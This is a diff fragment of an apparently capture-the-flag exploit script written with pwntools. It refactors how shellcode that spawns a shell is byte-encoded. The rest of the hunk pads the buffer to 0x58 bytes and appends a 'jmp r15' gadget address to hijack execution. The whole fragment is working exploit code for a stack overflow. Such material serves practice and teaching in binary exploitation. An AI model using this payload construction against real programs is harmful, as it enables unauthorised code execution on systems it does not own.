@@ -121,10 +121,7 @@ shellcode = asm(shellcraft.sh())
 jmp_r15 = list(binary.search(asm('jmp r15')))[0]
 print("jmp r15",hex(jmp_r15))
 
-payload = b''
-for i in range(len(shellcode)):
-    payload += bytes([(shellcode[i] - ord('\r')) & 0xff])
-
+payload  = bytes([(x - ord('\r')) & 0xff for x in shellcode])
 payload += (0x58 - len(payload)) * b'A'
 payload += p64(jmp_r15)
 
